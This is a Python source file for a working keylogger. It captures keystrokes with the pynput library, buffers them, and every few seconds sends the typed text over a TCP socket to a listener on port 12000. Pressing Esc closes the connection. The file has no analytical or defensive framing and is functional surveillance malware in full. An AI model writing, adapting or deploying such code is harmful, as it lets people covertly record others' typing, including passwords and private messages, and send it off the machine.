import os
import socket
from pynput.keyboard import Key, Listener
import datetime

class Logger:
    def __init__(self, s):
        self.str_holder = ''
        self.timestamp = datetime.datetime.now()
        self.socket = s
 
    def on_press(self, key):
        key_char = str(key).strip("'")
        
        # Edit special inputs
        if key_char == 'Key.space':
            key_char = ' '
        elif len(key_char) > 1:
            key_char = ''
        
        self.str_holder += key_char
        

    def on_release(self, key):
        cur_time = datetime.datetime.now()
        # Log if a long enough time has elapsed
        if cur_time - self.timestamp > datetime.timedelta(seconds=5):
            s.sendall((self.str_holder[:-1]).encode('utf-8'))
            self.str_holder = str(key).strip("'")
            
        if key == Key.esc:
            s.sendall(("commit sudoku").encode('utf-8'))
            self.socket.close()
            return False
        
        self.timestamp = cur_time

    def run(self):
        with Listener(on_press=self.on_press, on_release=self.on_release) as listener :
            listener.join()

# Create Socket and Connect to Host
host = socket.gethostname()
port = 12000
s = socket.socket()		# TCP socket object
s.connect((host,port))

logger = Logger(s)
logger.run()